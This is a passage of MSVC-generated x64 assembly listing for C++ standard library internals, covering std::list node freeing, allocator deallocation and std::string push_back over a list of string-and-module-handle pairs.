	call	??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, QWORD PTR [rbx]
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1505 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	jmp	??3@YAXPEAX_K@Z				; operator delete
?_Tidy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Tidy
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Unchecked_end@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
__$ReturnUdt$ = 16
?_Unchecked_end@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_end, COMDAT

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rax, QWORD PTR [rcx]
	mov	QWORD PTR [rdx], rax

; 1116 :         return _Unchecked_iterator(_Mypair._Myval2._Myhead, nullptr);

	mov	rax, rdx

; 1117 :     }

	ret	0
?_Unchecked_end@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_end
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Unchecked_begin@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
__$ReturnUdt$ = 16
?_Unchecked_begin@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_begin, COMDAT

; 1108 :         return _Unchecked_iterator(_Mypair._Myval2._Myhead->_Next, nullptr);

	mov	rax, QWORD PTR [rcx]

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rcx, QWORD PTR [rax]

; 1108 :         return _Unchecked_iterator(_Mypair._Myval2._Myhead->_Next, nullptr);

	mov	rax, rdx

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR [rdx], rcx

; 1109 :     }

	ret	0
?_Unchecked_begin@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_begin
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?end@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
__$ReturnUdt$ = 16
?end@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::end, COMDAT

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rax, QWORD PTR [rcx]
	mov	QWORD PTR [rdx], rax

; 1100 :         return iterator(_Mypair._Myval2._Myhead, _STD addressof(_Mypair._Myval2));

	mov	rax, rdx

; 1101 :     }

	ret	0
?end@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::end
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??0?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@QEAA@XZ PROC ; std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >, COMDAT

; 939  :     constexpr allocator() noexcept {}

	mov	rax, rcx
	ret	0
??0?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@QEAA@XZ ENDP ; std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??0?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEAA@XZ PROC ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1496 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

	mov	DWORD PTR [rcx], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 132  :         : _Mypair(_Zero_then_variadic_args_t{}, _Zero_then_variadic_args_t{}, 0.0f) {}

	mov	rax, rcx
	ret	0
??0?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEAA@XZ ENDP ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?deallocate@?$allocator@PEBD@std@@QEAAXQEAPEBD_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Ptr$ = 56
_Count$ = 64
?deallocate@?$allocator@PEBD@std@@QEAAXQEAPEBD_K@Z PROC	; std::allocator<char const *>::deallocate, COMDAT

; 947  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN23:
	sub	rsp, 40					; 00000028H
	mov	rax, rdx

; 948  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 949  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	lea	rdx, QWORD PTR [r8*8]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN17@deallocate

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rax-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN14@deallocate

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rax, rcx
$LN17@deallocate:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rax

; 951  :     }

	add	rsp, 40					; 00000028H

; 258  :         ::operator delete(_Ptr, _Bytes);

	jmp	??3@YAXPEAX_K@Z				; operator delete
$LN14@deallocate:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN20@deallocate:
?deallocate@?$allocator@PEBD@std@@QEAAXQEAPEBD_K@Z ENDP	; std::allocator<char const *>::deallocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z
_TEXT	SEGMENT
this$ = 8
_Ch$ = 16
?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back, COMDAT

; 4087 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

	mov	r8, QWORD PTR [rcx+16]

; 4088 :         if (_Old_size < _Mypair._Myval2._Myres) {

	mov	r9, QWORD PTR [rcx+24]
	cmp	r8, r9
	jae	SHORT $LN2@push_back

; 4089 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + 1);
; 4090 :             _Mypair._Myval2._Mysize = _Old_size + 1;

	lea	rax, QWORD PTR [r8+1]
	mov	QWORD PTR [rcx+16], rax

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r9, 15

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN5@push_back

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rcx, QWORD PTR [rcx]
$LN5@push_back:

; 4091 :             _Elem* const _Ptr       = _Mypair._Myval2._Myptr();
; 4092 :             _Traits::assign(_Ptr[_Old_size], _Ch);

	mov	BYTE PTR [rcx+r8], dl

; 4093 :             _Traits::assign(_Ptr[_Old_size + 1], _Elem());

	mov	BYTE PTR [rcx+r8+1], 0

; 4098 :             1,
; 4099 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem _Ch)
; 4100 :                 _STATIC_CALL_OPERATOR {
; 4101 :                     _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 4102 :                     _Traits::assign(_New_ptr[_Old_size], _Ch);
; 4103 :                     _Traits::assign(_New_ptr[_Old_size + 1], _Elem());
; 4104 :                 },
; 4105 :             _Ch);
; 4106 :     }

	ret	0
$LN2@push_back:

; 4094 :             return;
; 4095 :         }
; 4096 : 
; 4097 :         _Reallocate_grow_by(

	movzx	r9d, dl
	jmp	??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<`std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back'::`2'::<lambda_1>,char>
?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??R<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@QEBA@QEADQEBD_KD@Z
_TEXT	SEGMENT
this$dead$ = 48
_New_ptr$ = 56
_Old_ptr$ = 64
_Old_size$ = 72
_Ch$ = 80
??R<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@QEBA@QEADQEBD_KD@Z PROC ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back'::`2'::<lambda_1>::operator(), COMDAT

; 4100 :                 _STATIC_CALL_OPERATOR {

$LN18:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rax, r8
	mov	rbx, rdx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rdx, rax
	mov	rcx, rbx
	mov	r8, r9

; 4100 :                 _STATIC_CALL_OPERATOR {

	mov	rdi, r9

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	call	memcpy

; 4101 :                     _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 4102 :                     _Traits::assign(_New_ptr[_Old_size], _Ch);

	movzx	eax, BYTE PTR _Ch$[rsp]
	mov	BYTE PTR [rbx+rdi], al

; 4103 :                     _Traits::assign(_New_ptr[_Old_size + 1], _Elem());

	mov	BYTE PTR [rbx+rdi+1], 0

; 4104 :                 },

	mov	rbx, QWORD PTR [rsp+48]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??R<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@QEBA@QEADQEBD_KD@Z ENDP ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
this$ = 8
_Right$ = 16
?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents, COMDAT

; 3056 :         // assign by stealing _Right's buffer
; 3057 :         // pre: this != &_Right
; 3058 :         // pre: allocator propagation (POCMA) from _Right, if necessary, is complete
; 3059 :         // pre: *this owns no memory, iterators orphaned
; 3060 :         // (note: _Buf/_Ptr/_Mysize/_Myres may be garbage init)
; 3061 :         auto& _My_data    = _Mypair._Myval2;
; 3062 :         auto& _Right_data = _Right._Mypair._Myval2;
; 3063 : 
; 3064 : #if !defined(_INSERT_STRING_ANNOTATION)
; 3065 :         if constexpr (_Can_memcpy_val) {
; 3066 : #if _HAS_CXX20
; 3067 :             if (!_STD is_constant_evaluated())
; 3068 : #endif // _HAS_CXX20
; 3069 :             {
; 3070 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3071 :                 if (_Right_data._Large_mode_engaged()) {
; 3072 :                     // take ownership of _Right's iterators along with its buffer
; 3073 :                     _Swap_proxy_and_iterators(_Right);
; 3074 :                 } else {
; 3075 :                     _Right_data._Orphan_all();
; 3076 :                 }
; 3077 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3078 : 
; 3079 :                 const auto _My_data_mem =
; 3080 :                     reinterpret_cast<unsigned char*>(_STD addressof(_Mypair._Myval2)) + _Memcpy_val_offset;
; 3081 :                 const auto _Right_data_mem =
; 3082 :                     reinterpret_cast<const unsigned char*>(_STD addressof(_Right._Mypair._Myval2)) + _Memcpy_val_offset;
; 3083 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

	movups	xmm0, XMMWORD PTR [rdx]
	movups	XMMWORD PTR [rcx], xmm0
	movups	xmm1, XMMWORD PTR [rdx+16]
	movups	XMMWORD PTR [rcx+16], xmm1

; 3084 : 
; 3085 :                 _Right_data._Mysize = 0;
; 3086 :                 _Right_data._Myres  = _Small_string_capacity;
; 3087 :                 _Right_data._Activate_SSO_buffer();
; 3088 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());
; 3089 :                 return;
; 3090 :             }
; 3091 :         }
; 3092 : #endif // !defined(_INSERT_STRING_ANNOTATION)
; 3093 : 
; 3094 :         if (_Right_data._Large_mode_engaged()) { // steal buffer
; 3095 :             _Swap_proxy_and_iterators(_Right);
; 3096 : 
; 3097 :             _Construct_in_place(_My_data._Bx._Ptr, _Right_data._Bx._Ptr);
; 3098 :             _Right_data._Bx._Switch_to_buf();
; 3099 :         } else { // copy small string buffer
; 3100 :             _Right_data._Orphan_all();
; 3101 : 
; 3102 :             _My_data._Activate_SSO_buffer();
; 3103 :             _Traits::copy(_My_data._Bx._Buf, _Right_data._Bx._Buf, _Right_data._Mysize + 1);
; 3104 :         }
; 3105 : 
; 3106 :         _My_data._Myres  = _Right_data._Myres;
; 3107 :         _My_data._Mysize = _Right_data._Mysize;
; 3108 : 
; 3109 :         _Right_data._Mysize = 0;
; 3110 :         _Right_data._Myres  = _Small_string_capacity;
; 3111 :         _Traits::assign(_Right_data._Bx._Buf[0], _Elem());
; 3112 :     }

	mov	QWORD PTR [rdx+16], 0
	mov	QWORD PTR [rdx+24], 15
	mov	BYTE PTR [rdx], 0
	ret	0
?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??0?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
__param0$ = 16
__param1$dead$ = 24
??0?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z PROC ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >, COMDAT

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	ret	0
??0?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z ENDP ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??0?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z
_TEXT	SEGMENT
